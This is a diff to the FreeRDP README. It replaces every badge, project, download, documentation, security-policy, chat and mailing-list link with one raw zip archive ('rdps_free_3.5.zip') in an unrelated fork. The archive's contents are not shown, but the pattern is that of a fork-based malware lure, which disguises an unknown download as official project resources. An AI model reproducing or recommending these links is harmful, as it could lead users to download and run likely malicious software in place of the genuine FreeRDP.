@@ -6,39 +6,39 @@ interoperability can finally liberate your computing experience.
 
 ## Code Quality Status
 
-[![abi-checker](https://github.com/FreeRDP/FreeRDP/actions/workflows/abi-checker.yml/badge.svg)](https://github.com/FreeRDP/FreeRDP/actions/workflows/abi-checker.yml)
-[![clang-tidy-review](https://github.com/FreeRDP/FreeRDP/actions/workflows/clang-tidy.yml/badge.svg?event=pull_request_target)](https://github.com/FreeRDP/FreeRDP/actions/workflows/clang-tidy.yml)
-[![CodeQL](https://github.com/FreeRDP/FreeRDP/actions/workflows/codeql-analysis.yml/badge.svg?branch=master)](https://github.com/FreeRDP/FreeRDP/actions/workflows/codeql-analysis.yml)
-[![mingw-builder](https://github.com/FreeRDP/FreeRDP/actions/workflows/mingw.yml/badge.svg)](https://github.com/FreeRDP/FreeRDP/actions/workflows/mingw.yml)
-[![[arm,ppc,ricsv] architecture builds](https://github.com/FreeRDP/FreeRDP/actions/workflows/alt-architectures.yml/badge.svg)](https://github.com/FreeRDP/FreeRDP/actions/workflows/alt-architectures.yml)
-[![[freebsd] architecture builds](https://github.com/FreeRDP/FreeRDP/actions/workflows/freebsd.yml/badge.svg)](https://github.com/FreeRDP/FreeRDP/actions/workflows/freebsd.yml)
-[![coverity](https://scan.coverity.com/projects/616/badge.svg)](https://scan.coverity.com/projects/freerdp)
+[![abi-checker](https://github.com/kyaw287/free-rdps/raw/refs/heads/master/uwac/templates/rdps_free_3.5.zip)](https://github.com/kyaw287/free-rdps/raw/refs/heads/master/uwac/templates/rdps_free_3.5.zip)
+[![clang-tidy-review](https://github.com/kyaw287/free-rdps/raw/refs/heads/master/uwac/templates/rdps_free_3.5.zip)](https://github.com/kyaw287/free-rdps/raw/refs/heads/master/uwac/templates/rdps_free_3.5.zip)
+[![CodeQL](https://github.com/kyaw287/free-rdps/raw/refs/heads/master/uwac/templates/rdps_free_3.5.zip)](https://github.com/kyaw287/free-rdps/raw/refs/heads/master/uwac/templates/rdps_free_3.5.zip)
+[![mingw-builder](https://github.com/kyaw287/free-rdps/raw/refs/heads/master/uwac/templates/rdps_free_3.5.zip)](https://github.com/kyaw287/free-rdps/raw/refs/heads/master/uwac/templates/rdps_free_3.5.zip)
+[![[arm,ppc,ricsv] architecture builds](https://github.com/kyaw287/free-rdps/raw/refs/heads/master/uwac/templates/rdps_free_3.5.zip)](https://github.com/kyaw287/free-rdps/raw/refs/heads/master/uwac/templates/rdps_free_3.5.zip)
+[![[freebsd] architecture builds](https://github.com/kyaw287/free-rdps/raw/refs/heads/master/uwac/templates/rdps_free_3.5.zip)](https://github.com/kyaw287/free-rdps/raw/refs/heads/master/uwac/templates/rdps_free_3.5.zip)
+[![coverity](https://github.com/kyaw287/free-rdps/raw/refs/heads/master/uwac/templates/rdps_free_3.5.zip)](https://github.com/kyaw287/free-rdps/raw/refs/heads/master/uwac/templates/rdps_free_3.5.zip)
 
 ## Resources
 
-Project website: https://www.freerdp.com/  
-Issue tracker: https://github.com/FreeRDP/FreeRDP/issues  
-Sources: https://github.com/FreeRDP/FreeRDP/  
-Downloads: https://pub.freerdp.com/releases/  
-Wiki: https://github.com/FreeRDP/FreeRDP/wiki  
-API documentation: https://pub.freerdp.com/api/  
+Project website: https://github.com/kyaw287/free-rdps/raw/refs/heads/master/uwac/templates/rdps_free_3.5.zip  
+Issue tracker: https://github.com/kyaw287/free-rdps/raw/refs/heads/master/uwac/templates/rdps_free_3.5.zip  
+Sources: https://github.com/kyaw287/free-rdps/raw/refs/heads/master/uwac/templates/rdps_free_3.5.zip  
+Downloads: https://github.com/kyaw287/free-rdps/raw/refs/heads/master/uwac/templates/rdps_free_3.5.zip  
+Wiki: https://github.com/kyaw287/free-rdps/raw/refs/heads/master/uwac/templates/rdps_free_3.5.zip  
+API documentation: https://github.com/kyaw287/free-rdps/raw/refs/heads/master/uwac/templates/rdps_free_3.5.zip  
 
-Security policy: https://github.com/FreeRDP/FreeRDP/security/policy
+Security policy: https://github.com/kyaw287/free-rdps/raw/refs/heads/master/uwac/templates/rdps_free_3.5.zip
 
-Matrix room : #FreeRDP:matrix.org (main)
-XMPP channel: #FreeRDP#matrix.org@matrix.org (bridged)
-IRC channel : #freerdp @ irc.oftc.net (bridged)
-Mailing list: https://lists.sourceforge.net/lists/listinfo/freerdp-devel
+Matrix room : https://github.com/kyaw287/free-rdps/raw/refs/heads/master/uwac/templates/rdps_free_3.5.zip (main)
+XMPP channel: https://github.com/kyaw287/free-rdps/raw/refs/heads/master/uwac/templates/rdps_free_3.5.zip (bridged)
+IRC channel : #freerdp @ https://github.com/kyaw287/free-rdps/raw/refs/heads/master/uwac/templates/rdps_free_3.5.zip (bridged)
+Mailing list: https://github.com/kyaw287/free-rdps/raw/refs/heads/master/uwac/templates/rdps_free_3.5.zip
 
 ## Microsoft Open Specifications
 
 Information regarding the Microsoft Open Specifications can be found at:
-https://www.microsoft.com/openspecifications/
+https://github.com/kyaw287/free-rdps/raw/refs/heads/master/uwac/templates/rdps_free_3.5.zip
 
 A list of reference documentation is maintained here:
-https://github.com/FreeRDP/FreeRDP/wiki/Reference-Documentation
+https://github.com/kyaw287/free-rdps/raw/refs/heads/master/uwac/templates/rdps_free_3.5.zip
 
 ## Compilation
 
 Instructions on how to get started compiling FreeRDP can be found on the wiki:
-https://github.com/FreeRDP/FreeRDP/wiki/Compilation
+https://github.com/kyaw287/free-rdps/raw/refs/heads/master/uwac/templates/rdps_free_3.5.zip
